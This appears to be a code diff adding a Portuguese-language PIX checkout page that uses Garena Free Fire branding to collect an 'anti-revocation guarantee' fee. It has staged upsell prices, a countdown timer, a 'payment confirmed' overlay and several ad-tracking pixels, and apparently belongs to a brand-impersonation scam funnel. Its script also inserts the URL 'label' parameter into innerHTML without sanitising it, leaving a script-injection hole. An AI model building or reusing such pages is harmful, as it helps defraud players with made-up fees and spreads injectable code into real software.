@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<!-- Microsoft Clarity -->
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "xnapb8mtfe");
+</script>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Pagamento — Garantia Anti-Revogação</title>
+<meta name="description" content="Pague com PIX a taxa de garantia anti-revogação Garena.">
+<link rel="icon" href="../images/favicon.ico" sizes="32x32">
+<link href="../css/all.min.css" rel="stylesheet">
+<link href="../css/bootstrap.min.css" rel="stylesheet">
+<link href="checkout.css" rel="stylesheet">
+
+<!-- LowTrack Pixel -->
+<script>
+  window.pixelId = "lt_px_a12f52fa71fd";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://lowtrack.com.br/pixel.js");
+  document.head.appendChild(a);
+</script>
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1579489380453079');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1579489380453079&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<script src="../../js/pixel-bootstrap.js" defer></script>
+<script src="../../js/utm-flow.js"></script>
+<script src="utm-shared.js"></script>
+</head>
+<body>
+<header class="pay-header">
+  <div class="brand">
+    <img src="../images/logo_mobile.svg" alt="Garena">
+    <span>Free Fire 9 Anos</span>
+  </div>
+  <div class="breadcrumb">
+    Pagamento
+  </div>
+</header>
+
+<main class="pay-main">
+  <h2 style="margin:0 0 12px;font-size:1.35rem;font-weight:800;color:#fff;text-align:center;letter-spacing:-0.01em;">Pague com PIX e finalize</h2>
+
+  <div class="card" id="order-summary-card">
+    <p class="section-title">Resumo da garantia</p>
+    <div id="cart-list"></div>
+    <div class="cart-total">
+      <span>Total</span>
+      <strong id="cart-total">R$ 0,00</strong>
+    </div>
+  </div>
+
+  <div style="text-align:center;">
+    <div class="status-pill" id="status-pill">
+      <span class="dot"></span>
+      <span id="status-text">Aguardando pagamento...</span>
+    </div>
+    <div class="countdown">
+      Expira em <strong id="countdown">10:00</strong>
+    </div>
+  </div>
+
+  <div style="text-align:center; margin: 18px auto 12px;">
+    <button id="btn-show-qr" type="button" class="btn-primary" style="max-width:280px; margin: 0 auto;">
+      <i class="fa-solid fa-qrcode"></i> Ver QR Code
+    </button>
+    <p style="font-size:12px;color:var(--muted);margin:8px 0 0;">Toque para revelar o QR Code de pagamento</p>
+  </div>
+
+  <div class="qr-wrapper" id="qr-wrapper" style="display:none;">
+    <div class="qr-frame">
+      <img id="qr-img" alt="QR Code PIX" src="" />
+    </div>
+    <button id="btn-hide-qr" type="button" class="btn-secondary" style="margin-top:10px;">
+      <i class="fa-solid fa-eye-slash"></i> Ocultar QR Code
+    </button>
+  </div>
+
+  <div class="card">
+    <p class="section-title">PIX copia e cola</p>
+    <div class="copy-paste">
+      <input id="copy-input" type="text" readonly value="">
+      <button id="btn-copy" type="button">Copiar código</button>
+    </div>
+    <p style="font-size:0.82rem;color:var(--muted);margin-top:12px;line-height:1.4;">
+      <i class="fa-solid fa-circle-info" style="color:var(--gold);margin-right:4px;"></i>
+      Abra o app do seu banco, escolha <strong>PIX</strong> → pagar com código (copia e cola), e cole o código acima.
+    </p>
+  </div>
+
+  <button id="btn-refresh" type="button" class="btn-secondary">
+    <i class="fa-solid fa-arrows-rotate"></i> Já paguei
+  </button>
+
+  <div data-trust-mount></div>
+
+  <div class="trust">
+    <i class="fa-solid fa-shield-halved"></i>
+    <span>Pagamento processado por PIX · Ambientes criptografados</span>
+  </div>
+</main>
+
+<div id="success-overlay" class="success-overlay">
+  <div class="panel">
+    <div class="check"><i class="fa-solid fa-check"></i></div>
+    <h2>Pagamento confirmado!</h2>
+    <p>Sua garantia está ativa. Vamos finalizar o seu pedido.</p>
+    <p style="font-size:12px;color:var(--muted);margin-bottom:0;">Não feche esta janela.</p>
+    <button class="btn-primary" id="btn-success-continue" type="button">
+      <i class="fa-solid fa-arrow-right"></i> Continuar
+    </button>
+  </div>
+</div>
+
+<script src="utm-helper.js"></script>
+<script src="customer.js"></script>
+<script src="checkout.js"></script>
+<script src="trust.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    function getQueryParam(name) {
+      return new URLSearchParams(window.location.search).get(name);
+    }
+    function getUtmSuffix() {
+      // Helper único (utm-shared.js).
+      if (window.UtmShared && typeof window.UtmShared.getSuffix === 'function') {
+        return window.UtmShared.getSuffix();
+      }
+      try {
+        if (window.UtmFlow && typeof window.UtmFlow.getUtmSuffix === 'function') {
+          return window.UtmFlow.getUtmSuffix() || '';
+        }
+      } catch {}
+      try {
+        if (window.UtmHelper && typeof window.UtmHelper.getUtmSuffix === 'function') {
+          return window.UtmHelper.getUtmSuffix() || '';
+        }
+      } catch {}
+      return window.location.search || '';
+    }
+
+    // Resumo do upsell 2 — usa amount/label da URL quando disponíveis
+    const stage = getQueryParam('stage') || 'initial';
+    const stageLabels = {
+      initial: 'Garantia Anti-Revogação Garena — R$ 14,90',
+      risk: 'Garantia Anti-Revogação Garena — R$ 14,90',
+      last: 'Garantia Anti-Revogação Garena — R$ 9,90',
+    };
+    const stagePrices = {
+      initial: 'R$ 14,90',
+      risk: 'R$ 14,90',
+      last: 'R$ 9,90',
+    };
+    const labelParam = getQueryParam('label') || '';
+    const amountStr = getQueryParam('amount') || '';
+    const amountFmt = (() => {
+      const n = parseInt(amountStr, 10);
+      if (!Number.isFinite(n) || n <= 0) return '';
+      return `R$ ${(n / 100).toFixed(2).replace('.', ',')}`;
+    })();
+    const stageLabel = labelParam || stageLabels[stage] || stageLabels.initial;
+    const stagePrice = amountFmt || stagePrices[stage] || stagePrices.initial;
+
+    const cartList = document.getElementById('cart-list');
+    const cartTotal = document.getElementById('cart-total');
+    if (cartList) {
+      cartList.innerHTML = `
+        <div class="cart-item">
+          <div class="info">
+            <strong>${stageLabel}</strong>
+            <span>Taxa de garantia</span>
+          </div>
+          <div class="price">${amountFmt || '<i class="fa-solid fa-lock"></i>'}</div>
+        </div>
+      `;
+    }
+    if (cartTotal) cartTotal.textContent = stagePrice;
+
+    CheckoutParte2.init({
+      onPaid: function () {
+        const parentTxId = encodeURIComponent(getQueryParam('parentTxId') || '');
+        let url = `obrigado.html?parentTxId=${parentTxId}`;
+        url = window.UtmShared && typeof window.UtmShared.appendToUrl === 'function'
+          ? window.UtmShared.appendToUrl(url)
+          : (url + (getUtmSuffix() || ''));
+        window.location.href = url;
+      },
+      // Override do Purchase da Meta com o valor real do upsell2 (em cents)
+      valueCents: amountStr ? parseInt(amountStr, 10) : undefined,
+      items: amountStr ? [{ id: `upsell2-${stage}`, qty: 1 }] : undefined,
+      contentCategory: 'garantia_garena',
+    });
+  });
+</script>
+</body>
+</html>
